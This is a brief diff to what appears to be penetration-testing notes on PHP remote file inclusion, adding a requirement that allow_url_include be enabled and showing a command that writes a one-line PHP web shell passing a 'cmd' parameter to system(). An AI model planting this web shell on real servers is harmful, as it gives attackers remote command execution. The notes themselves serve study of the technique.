@@ -1,3 +1,9 @@
+
+Requirements for method to work
+```
+allow_url_include in php.ini
+```
+
 Create php page
 ```shell-session
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
